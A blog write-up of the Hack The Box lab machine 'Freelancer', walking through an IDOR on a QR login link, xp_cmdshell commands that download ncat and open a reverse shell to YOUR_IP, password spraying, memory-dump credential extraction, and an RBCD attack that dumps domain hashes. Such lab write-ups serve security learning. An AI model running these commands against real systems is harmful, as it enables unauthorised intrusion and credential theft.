<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Freelancer</title>
<meta name=description content="Platform: Hack The Box Link: Freelancer Level: Hard OS: Windows Read this write up in french
Freelancer begins with a website that allows the creation of …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-freelancer/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Freelancer"><meta property="og:description" content="Platform: Hack The Box Link: Freelancer Level: Hard OS: Windows Read this write up in french
Freelancer begins with a website that allows the creation of …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Freelancer/Freelancer.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Freelancer/Freelancer.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Freelancer"><meta name=twitter:description content="Platform: Hack The Box Link: Freelancer Level: Hard OS: Windows Read this write up in french
Freelancer begins with a website that allows the creation of …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-freelancer/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-freelancer/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Freelancer/Freelancer.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-freelancer/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-freelancer/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Freelancer</h1><small role=doc-subtitle></small><p class=post-date>9 min read |
<span class=post-date>September 30, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Freelancer>Freelancer</a></li><li>Level: Hard</li><li>OS: Windows</li></ul><hr><p><a href=https://scorpiosec.com/fr/posts/htb-freelancer/>Read this write up in french</a></p><p>Freelancer begins with a website that allows the creation of various types of accounts. After registering, we exploit an Insecure Direct Object Reference (IDOR) vulnerability to gain access to an admin account. On the admin page, we find a SQL terminal, which we leverage to obtain an initial foothold.</p><p>Further exploration of the system reveals passwords in a configuration file, which we run against a user list, enabling us to pivot to another account and obtain the user flag. We then extract a 7z archive containing a full memory dump. Using MemProcFS, we analyze the dump and recover another password, allowing us to take over another account.</p><p>With Bloodhound, we identify the presence of the <code>GenericWrite</code> permission, which we exploit through resource-based constrained delegation (RBCD). This leads to obtaining the administrator hash, enabling us to get root flag.</p><p>Target IP Address - <code>10.10.11.5</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.11.5 Freelancer
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49680,49685,51337,55297
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-09-30 13:27 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.5
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.053s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>80/tcp    open  http          nginx 1.25.5
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.25.5
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://freelancer.htb/
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-09-30 23:27:24Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: freelancer.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp   open  tcpwrapped
</span></span><span style=display:flex><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: freelancer.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>3269/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>9389/tcp  open  adws?
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   DNSStatusRequestTCP, Kerberos, SMBProgNeg, afp, oracle-tns: 
</span></span><span style=display:flex><span>|_    Ihttp://schemas.microsoft.com/ws/2006/05/framing/faults/UnsupportedVersion
</span></span><span style=display:flex><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49671/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49676/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>49680/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49685/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>51337/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>55297/tcp open  ms-sql-s      Microsoft SQL Server <span style=color:#d19a66>2019</span> 15.00.2000.00; RTM
</span></span><span style=display:flex><span>| ms-sql-ntlm-info: 
</span></span><span style=display:flex><span>|   10.10.11.5<span style=color:#98c379>\S</span>QLEXPRESS: 
</span></span><span style=display:flex><span>|     Target_Name: FREELANCER
</span></span><span style=display:flex><span>|     NetBIOS_Domain_Name: FREELANCER
</span></span><span style=display:flex><span>|     NetBIOS_Computer_Name: DC
</span></span><span style=display:flex><span>|     DNS_Domain_Name: freelancer.htb
</span></span><span style=display:flex><span>|     DNS_Computer_Name: DC.freelancer.htb
</span></span><span style=display:flex><span>|     DNS_Tree_Name: freelancer.htb
</span></span><span style=display:flex><span>|_    Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_ssl-date: 2024-09-30T23:28:31+00:00; +5h00m00s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>SSL_Self_Signed_Fallback
</span></span><span style=display:flex><span>| Not valid before: 2024-09-30T15:02:05
</span></span><span style=display:flex><span>|_Not valid after:  2054-09-30T15:02:05
</span></span><span style=display:flex><span>| ms-sql-info: 
</span></span><span style=display:flex><span>|   10.10.11.5<span style=color:#98c379>\S</span>QLEXPRESS: 
</span></span><span style=display:flex><span>|     Instance name: SQLEXPRESS
</span></span><span style=display:flex><span>|     Version: 
</span></span><span style=display:flex><span>|       name: Microsoft SQL Server <span style=color:#d19a66>2019</span> RTM
</span></span><span style=display:flex><span>|       number: 15.00.2000.00
</span></span><span style=display:flex><span>|       Product: Microsoft SQL Server <span style=color:#d19a66>2019</span>
</span></span><span style=display:flex><span>|       Service pack level: RTM
</span></span><span style=display:flex><span>|       Post-SP patches applied: <span style=color:#e5c07b>false</span>
</span></span><span style=display:flex><span>|     TCP port: <span style=color:#d19a66>55297</span>
</span></span><span style=display:flex><span>|     Named pipe: <span style=color:#98c379>\\</span>10.10.11.5<span style=color:#98c379>\p</span>ipe<span style=color:#98c379>\M</span>SSQL<span style=color:#e06c75>$SQLEXPRESS</span><span style=color:#98c379>\s</span>ql<span style=color:#98c379>\q</span>uery
</span></span><span style=display:flex><span>|_    Clustered: <span style=color:#e5c07b>false</span>
</span></span><span style=display:flex><span><span style=color:#d19a66>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span>SF-Port9389-TCP:V<span style=color:#56b6c2>=</span>7.94SVN%I<span style=color:#56b6c2>=</span>7%D<span style=color:#56b6c2>=</span>9/30%Time<span style=color:#56b6c2>=</span>66FAED91%P<span style=color:#56b6c2>=</span>x86_64-pc-linux-gnu%r
</span></span><span style=display:flex><span>SF:<span style=color:#56b6c2>(</span>DNSStatusRequestTCP,4B,<span style=color:#98c379>&#34;\x08Ihttp://schemas\.microsoft\.com/ws/2006/05
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:/framing/faults/UnsupportedVersion&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>Kerberos,4B,<span style=color:#98c379>&#34;\x08Ihttp://schemas
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\.microsoft\.com/ws/2006/05/framing/faults/UnsupportedVersion&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>SMBPr
</span></span><span style=display:flex><span>SF:ogNeg,4B,<span style=color:#98c379>&#34;\x08Ihttp://schemas\.microsoft\.com/ws/2006/05/framing/faults
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:/UnsupportedVersion&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>oracle-tns,4B,<span style=color:#98c379>&#34;\x08Ihttp://schemas\.microsoft\.
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:com/ws/2006/05/framing/faults/UnsupportedVersion&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>afp,4B,<span style=color:#98c379>&#34;\x08Ihttp:
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF://schemas\.microsoft\.com/ws/2006/05/framing/faults/UnsupportedVersion&#34;</span>
</span></span><span style=display:flex><span>SF:<span style=color:#56b6c2>)</span>;
</span></span><span style=display:flex><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-09-30T23:28:19
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 74.93 seconds
</span></span></code></pre></div><p>We are dealing with a domain controller, a website and a redirection to <code>freelancer.htb</code>.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.5 freelancer.htb dc.freelancer.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>We find a website at <code>http://freelancer.htb/</code>. It is a freelancing platform and we can register either as an employer or a freelancer.</p><p><img src=/images/HTB-Freelancer/freelancer_website.png alt="Freelancer website"></p><p>Let&rsquo;s try to create an employer account. There is a password policy so we need to come up with an &ldquo;uncommon&rdquo; one, I used <code>Pa$$w0rd95</code>.</p><p><img src=/images/HTB-Freelancer/registration.png alt="Employer account registration"></p><p>Trying to login fails because our newly created account is not active.</p><p><img src=/images/HTB-Freelancer/account_inactive.png alt="Account inactive"></p><p>We can bypass it by resetting the password. For the new password I used <code>Pa$$w0rd10</code>. Now we are able to login and we gain access to the Dashboard.</p><p><img src=/images/HTB-Freelancer/Freelancer_Dashboard.png alt="Freelancer Dashboard"></p><p>In the <code>QR-Code</code> section, we get a QR-Code to login without the use of credentials. In order to see where it points to we will use <code>zbarimg</code>.</p><p><img src=/images/HTB-Freelancer/QRcode_section.png alt="QR-Code section"></p><pre tabindex=0><code>sudo apt install zbar-tools
zbarimg QR-Code.png
</code></pre><blockquote><p>I saved the image of the qr-code as <code>QR-Code.png</code>.</p></blockquote><p><img src=/images/HTB-Freelancer/zbarimg.png alt="zbarimg tool"></p><p>The provided link brings us to our profile page.</p><p><img src=/images/HTB-Freelancer/profile_page.png alt="profile page"></p><p>When we look closely at the link generated it seems to be containing a base64 string <code>MTAwMTA=</code> which returns <code>10010</code> when decoded. Since the qrcode allows us to login without any credentials we can assume that this number is an account ID and the following string is a token value.</p><p>We will test for a potential Insecure Direct Object Reference (IDOR) vulnerability. If the url is still valid after modifying the ID we might be able to access an admin account, they usually have a small ID number such as 1 or 2.</p><p>For example: If our QR-Code link is <code>http://freelancer.htb/accounts/login/otp/MTAwMTA=/d134f9ff8e33c6bdcefc73a7597e4552/</code> we will use <code>http://freelancer.htb/accounts/login/otp/Mgo=/d134f9ff8e33c6bdcefc73a7597e4552/</code>.</p><p>It turns out that with an ID number of 2 we can access an admin account. We just need to replace <code>MTAwMTA=</code> with <code>Mgo=</code> (base64 string for <code>2</code>).</p><p><img src=/images/HTB-Freelancer/admin_account.png alt="admin account"></p><p>Back to the enumeration, we discover an <code>admin</code> page which we are able to access.</p><p><img src=/images/HTB-Freelancer/gobuster_findings.png alt="gobuster command results"></p><p><img src=/images/HTB-Freelancer/freelancer_admindb.png alt="Freelancer admin dashboard"></p><h2 id=initial-foothold>Initial Foothold</h2><p>We have access to a SQL terminal under <code>Development Tools</code>. We can use it to execute some queries in order to get a reverse shell.</p><blockquote><p>We get the <code>netcat</code> binary for Windows <a href=https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86>here</a>, set up a Python web server to drop it on the target and gain our reverse shell by executing it.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#c678dd>EXECUTE</span> <span style=color:#c678dd>AS</span> <span style=color:#e06c75>LOGIN</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;sa&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#c678dd>EXECUTE</span> <span style=color:#e06c75>sp_configure</span> <span style=color:#98c379>&#39;show advanced options&#39;</span>, <span style=color:#d19a66>1</span>;
</span></span><span style=display:flex><span><span style=color:#e06c75>RECONFIGURE</span>;
</span></span><span style=display:flex><span><span style=color:#c678dd>EXECUTE</span> <span style=color:#e06c75>sp_configure</span> <span style=color:#98c379>&#39;xp_cmdshell&#39;</span>, <span style=color:#d19a66>1</span>;
</span></span><span style=display:flex><span><span style=color:#e06c75>RECONFIGURE</span>;
</span></span><span style=display:flex><span><span style=color:#c678dd>EXECUTE</span> <span style=color:#e06c75>xp_cmdshell</span> <span style=color:#98c379>&#34;powershell.exe wget http://YOUR_IP/ncat.exe -OutFile C:\temp\nc.exe&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>EXECUTE</span> <span style=color:#e06c75>xp_cmdshell</span> <span style=color:#98c379>&#34;powershell.exe C:\temp\nc.exe YOUR_IP PORT_NUMBER -e powershell&#34;</span>
</span></span></code></pre></div><p><img src=/images/HTB-Freelancer/sql_revshell.png alt="SQL reverse shell"></p><p>We now have a shell as <code>sql_svc</code>.</p><p><img src=/images/HTB-Freelancer/foothold.png alt="shell as sql_svc"></p><p>We find a lot of users on the target.</p><p><img src=/images/HTB-Freelancer/users_list.png alt="users list"></p><p>In <code>C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU\sql-Configuration.INI</code> we find two different passwords.</p><p><img src=/images/HTB-Freelancer/passwords_list.png alt="passwords list"></p><h3 id=shell-as-mikasaackerman>Shell as mikasaackerman</h3><p>At this point we have a list of users and passwords, we can use netexec to do some brute-forcing.</p><pre tabindex=0><code>netexec smb 10.10.11.5 -u users.txt -p pwd.txt
</code></pre><p>The credentials <code>mikasaAckerman:IL0v3ErenY3ager</code> are valid.</p><p><img src=/images/HTB-Freelancer/netexec_bruteforcing.png alt="netexec command"></p><p>We download <a href=https://github.com/antonioCoco/RunasCs>RunasCs</a> on the target and execute the command below.</p><pre tabindex=0><code>.\runascs.exe mikasaAckerman &#34;IL0v3ErenY3ager&#34; powershell -r &lt;YOUR_IP_ADDRESS&gt;:&lt;PORT_NUMBER&gt;
</code></pre><p><img src=/images/HTB-Freelancer/runascs_cmd.png alt="runascs command"></p><p>On our listener we gain a shell as <code>mikasaackerman</code>.</p><p><img src=/images/HTB-Freelancer/mickasa_shell.png alt="mickasaackerman shell"></p><p>On the Desktop we find the user flag and two other files <code>mail.txt</code> and <code>MEMORY.7z</code>.</p><p><img src=/images/HTB-Freelancer/user_flag.png alt="mickasaackerman desktop"></p><p>Thanks to <code>mail.txt</code> we learn that <code>MEMORY.7z</code> contains a full memory dump which we will send to our local machine for further examination.</p><p><img src=/images/HTB-Freelancer/mail_to_mikasa.png alt="mickasaackerman mail"></p><p>On our kali machine we spin up a FTP server.</p><blockquote><p>Use <code>sudo apt install python3-pyftpdlib</code> to install the module if it&rsquo;s missing.</p></blockquote><pre tabindex=0><code>sudo python3 -m pyftpdlib --port 21 --write
</code></pre><p><img src=/images/HTB-Freelancer/ftp_server.png alt="Python FTP server"></p><p>On the target we run</p><pre tabindex=0><code>(New-Object Net.WebClient).UploadFile(&#39;ftp://YOUR_IP/MEMORY.7z&#39;, &#39;C:\Users\mikasaAckerman\Desktop\MEMORY.7z&#39;)
</code></pre><p><img src=/images/HTB-Freelancer/file_upload.png alt="MEMORY.7z File upload"></p><p>After a few minutes we get the archive, extract it with <code>7z x MEMORY.7z</code> and end up with a file called <code>MEMORY.DMP</code>.</p><blockquote><p>You can install 7z with <code>sudo apt-get install p7zip-full</code>.</p></blockquote><p><img src=/images/HTB-Freelancer/memory_dump_file.png alt="Memory dump file"></p><p>We will use <a href=https://github.com/ufrisk/MemProcFS>MemProcFS</a> to look through the memory dump. First we to install all the dependencies.</p><pre tabindex=0><code>sudo apt-get install libusb-1.0 fuse openssl lz4
</code></pre><p>Then we download the archive from the releases page <a href=https://github.com/ufrisk/MemProcFS/releases/tag/v5.11>here</a>. After extracting it run the command below.</p><blockquote><p>If the mounting operation fails and you get <code>fuse: failed to access mountpoint /mnt/memprocfs: No such file or directory</code>, just create the directory in <code>/mnt</code>.</p></blockquote><pre tabindex=0><code>sudo ./memprocfs -f &lt;MEMORY.DMP file location&gt; -forensic 1 -mount /mnt/memprocfs
</code></pre><p><img src=/images/HTB-Freelancer/memprocfs_command.png alt="MemProcFS command"></p><p>We need to be root in order to access the mounted directory.</p><p><img src=/images/HTB-Freelancer/memory_mnt.png alt="MemProcFS mounted directory"></p><p>In <code>/mnt/memprocfs/registry/hive_files</code> we find the raw Windows registry hive files extracted from the memory dump. From here, we will use the files necessary to find some credentials:</p><ul><li><strong>SAM (Security Account Manager)</strong>: This hive contains information about the user accounts and the hashed passwords for local users.</li><li><strong>SYSTEM</strong>: It usually contains system information such as driver configurations, hardware settings etc. Additionally it also holds the key needed to decrypt passwords stored in the SAM hive.</li><li><strong>SECURITY</strong>: All the information about security is stored here including rights assignments, account policies, and encrypted LSA secrets (which might have cached domain credentials and other sensitive data).</li></ul><p><img src=/images/HTB-Freelancer/hive_files.png alt="hive files list"></p><pre tabindex=0><code>impacket-secretsdump -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive local
</code></pre><p><img src=/images/HTB-Freelancer/reghive_dump.png alt="registry hive files dump"></p><h3 id=shell-as-lorra199>Shell as lorra199</h3><p>We recover another password <code>PWN3D#l0rr@Armessa199</code>, let&rsquo;s run it against our users list.</p><pre tabindex=0><code>netexec smb 10.10.11.5 -u users.txt -p PWN3D#l0rr@Armessa199
</code></pre><p>We get a match for the credentials <code>lorra199:PWN3D#l0rr@Armessa199</code>.</p><p><img src=/images/HTB-Freelancer/lorra_creds.png alt="lorra199 credentials"></p><p>We login as this new user with <code>evil-winrm -i 10.10.11.5 -u lorra199 -p PWN3D#l0rr@Armessa199</code>.</p><p><img src=/images/HTB-Freelancer/lorra_shell.png alt="lorra199 login"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>This account does not seem to have anything interesting, so let&rsquo;s launch bloodhound from here and try to find more leads.</p><pre tabindex=0><code>bloodhound-python -c all -u lorra199 -p &#39;PWN3D#l0rr@Armessa199&#39; -d freelancer.htb -dc dc.freelancer.htb -ns 10.10.11.5
</code></pre><p><img src=/images/HTB-Freelancer/bloodhound_cmd.png alt="bloodhound command"></p><p>We see that <code>lorra199</code> is a member of <code>AD Recycle Bin</code>. The Active Directory Recycle Bin is a feature that allows administrators to recover accidentally deleted AD objects, such as users or organizational units (OUs), without having to restore from backups.</p><p><img src=/images/HTB-Freelancer/AD_Recycle_bin.png alt="AD Recycle bin membership"></p><p>Let&rsquo;s check the deleted objects.</p><pre tabindex=0><code>Get-ADObject -filter &#39;isdeleted -eq $true -and name -ne &#34;Deleted Objects&#34;&#39; -includeDeletedObjects -property *
</code></pre><p>We find <code>liza.kazanof</code> account in the recycle bin.</p><p><img src=/images/HTB-Freelancer/ad_recylce_bin.png alt="AD Recycle bin content"></p><p>We can restore the object by using its <code>ObjectGUID</code>.</p><pre tabindex=0><code>Restore-ADObject -identity &#34;ebe15df5-e265-45ec-b7fc-359877217138&#34;
</code></pre><blockquote><p>I am not sure how/if it is possible to get to root from the liza kazanof account. I will update this part if I find an exploitation path for it.
<strong>EDIT (10/8/2024)</strong>: I was not able to find this exploitation path on my own. 0xdf details it in his write up <a href=https://0xdf.gitlab.io/2024/10/05/htb-freelancer.html#intended-path>here</a>.</p></blockquote><p>The members of <code>AD Recycle Bin</code> have the <code>GenericWrite</code> permission on the domain controller which we can use to exploit the target via resource-based constrained delegation (RBCD). <em>Read more about it <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation>here</a></em>.</p><p><img src=/images/HTB-Freelancer/GenericWrite_priv.png alt="GenericWrite privilege"></p><ol><li>First we create a computer account (<code>KSCORPIO$</code>) in the domain with a specified password (<code>LETSgetr00t!</code>).</li></ol><pre tabindex=0><code>impacket-addcomputer -computer-name &#39;KSCORPIO$&#39; -computer-pass &#39;LETSgetr00t!&#39; -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:&#39;PWN3D#l0rr@Armessa199&#39;
</code></pre><p><img src=/images/HTB-Freelancer/impacket_addcomputer.png alt="GenericWrite privilege"></p><ol start=2><li>We modify the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute on the domain controller (<code>DC$</code>) to include the computer object <code>KSCORPIO$</code> to impersonate other accounts against <code>DC$</code>.</li></ol><pre tabindex=0><code>impacket-rbcd -delegate-from &#39;KSCORPIO$&#39; -delegate-to &#39;DC$&#39; -dc-ip 10.10.11.5 -action &#39;write&#39; &#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39;
</code></pre><p><img src=/images/HTB-Freelancer/rbcd_delegation.png alt="Delegation modification"></p><ol start=3><li>We obtain a Kerberos ticket for the CIFS service on the domain controller (<code>dc.freelancer.htb</code>), while impersonating <strong>Administrator</strong>. The ticket is what allows us to perform various operations on behalf on the administrator account on the target machine.</li></ol><pre tabindex=0><code>faketime -f +5h impacket-getST -spn &#39;cifs/dc.freelancer.htb&#39; -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/KSCORPIO$:&#39;LETSgetr00t!&#39;
</code></pre><blockquote><p>The SPN <code>cifs/dc.freelancer.htb</code> indicates that we want to authenticate to the file sharing service on the domain controller. The CIFS service is essentially an extension of the SMB protocol. <em>Read more about it <a href=https://www.upguard.com/blog/cifs>here</a>.</em></p></blockquote><p><img src=/images/HTB-Freelancer/Kerberos_ticket.png alt="Kerberos ticket"></p><ol start=4><li>In order to make Impacket use our ticket we set an environment variable pointing to the cache file.</li></ol><pre tabindex=0><code>export KRB5CCNAME=Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
</code></pre><p><img src=/images/HTB-Freelancer/env_var.png alt="environmental variable for kerberos ticket use"></p><ol start=5><li>Now we can dump the NTLM hashes from the domain controller. We obtain many hashes including the administrator one.</li></ol><pre tabindex=0><code>faketime -f +5h impacket-secretsdump &#39;freelancer.htb/Administrator@DC.freelancer.htb&#39; -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm
</code></pre><blockquote><p>We use <code>+5h</code> with faketime because of the clock-skew that can create synchronization issues. This line is from the nmap output: <code>clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s</code>.</p></blockquote><p><img src=/images/HTB-Freelancer/hashes_list.png alt="Kerberos ticket"></p><ol start=6><li>Finally, we login with the Administrator hash using evil-winrm and the root flag is on the Desktop.</li></ol><pre tabindex=0><code>evil-winrm -i freelancer.htb -u administrator -H &#39;0039318f1e8274633445bce32ad1a290&#39;
</code></pre><p><img src=/images/HTB-Freelancer/root_flag.png alt="Kerberos ticket"></p><p>This machine was really a banger for me! It was my first time working with memory dumps and I now have a better understanding of what RBCD is. I hope you were able to learn some things and thanks for taking the time to read my write up!</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-boardlight/>&#8592;
Previous:
HTB: BoardLight</a></p><p class=prev-post-date>September 27, 2024</p></div><div class=next-post><p><a href=/posts/htb-blurry/>Next:
HTB: Blurry
&#8594;</a></p><p class=next-post-date>October 10, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
